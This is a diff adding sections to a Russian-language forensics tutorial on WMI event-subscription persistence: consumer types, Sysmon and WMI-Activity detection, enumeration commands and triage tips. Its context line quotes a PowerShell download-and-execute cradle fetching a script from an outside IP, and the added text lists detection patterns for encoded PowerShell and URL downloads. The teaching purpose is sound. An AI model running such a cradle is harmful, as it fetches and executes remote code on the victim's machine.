@@ -253,6 +253,51 @@ IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.44/a.ps1')
 Связка «подписка → `CommandLineTemplate` → декодированная команда» даёт полную
 картину закрепления, которую не видно ни в реестре, ни в журналах.
 
+## Остальные типы потребителей
+
+`CommandLineEventConsumer` и `ActiveScriptEventConsumer` — самые частые, но не единственные. В `root\subscription` есть и другие:
+
+| Consumer | Что делает | Зачем атакующему |
+|----------|-----------|------------------|
+| `CommandLineEventConsumer` | запускает процесс | выполнить payload |
+| `ActiveScriptEventConsumer` | исполняет VBScript/JScript | файл не нужен вообще |
+| `LogFileEventConsumer` | пишет строку в лог | скрытая запись/маркер |
+| `SMTPEventConsumer` | отправляет письмо | эксфильтрация данных |
+| `NTEventLogEventConsumer` | пишет в журнал Windows | закрепление в EVTX |
+
+Фильтры (`__EventFilter`) тоже разнообразны: `__InstanceCreationEvent` (новый процесс/файл), `__InstanceModificationEvent` (изменение), таймерные `WITHIN N` (периодический запуск). Типовой «тихий» триггер — `WITHIN 60` на событие изменения системного счётчика: подписка срабатывает регулярно, а не по явному действию пользователя.
+
+## Обнаружение: Sysmon и журнал WMI-Activity
+
+Прямой детект дают события Sysmon (WMI-провайдер):
+
+- **Sysmon 19** — создание `WmiEventFilter` (фильтр);
+- **Sysmon 20** — создание `WmiEventConsumer`;
+- **Sysmon 21** — создание `WmiEventConsumerToFilter` (привязка).
+
+Правило обнаружения простое: **любое событие 19/20/21 с потребителем, запускающим `cmd`/`powershell`/скрипт из `%APPDATA%`/`%TEMP%`, — подозрительно**. Дополнительно `Microsoft-Windows-WMI-Activity/Operational` с EventID **5861** фиксирует регистрацию постоянной подписки даже там, где Sysmon нет.
+
+Для офлайн-анализа образов тот же детект работает по `OBJECTS.DATA`: ищи одновременно `__EventFilter`, имя потребителя и строку команды. Совпадение всех трёх — это подписка, а не случайная строка.
+
+## Инструменты: от Autoruns до Volatility
+
+На живой системе самый быстрый взгляд — вкладка **WMI** в Sysinternals **Autoruns** (и `Autoruns -accepteula -w`): она перечисляет все подписки, их фильтры и потребителей в одном окне. То же через PowerShell:
+
+```powershell
+Get-CimInstance -Namespace root\subscription -ClassName __EventFilter
+Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding
+Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer
+```
+
+На образе помогает Volatility-плагин `windows.registry`/`windows.wmi` (в разных сборках) либо парсер `python-cim`; из живого дампа памяти подписки тоже восстанавливаются. Правило одно: **смотри не на один класс, а на триаду целиком** — фильтр без потребителя или потребитель без привязки не срабатывают, значит искать надо связанную группу.
+
+## Как отличить легитимную подписку
+
+Не всякая WMI-подписка вредоносна: некоторые системы мониторинга и антивирусы
+создают свои. Смотри на `CommandLineTemplate`: если это `powershell -enc`, загрузка
+по URL или запуск из `%TEMP%`, перед тобой почти наверняка закрепление, а не
+штатная автоматизация.
+
 ## Квиз
 
 Проверь себя.
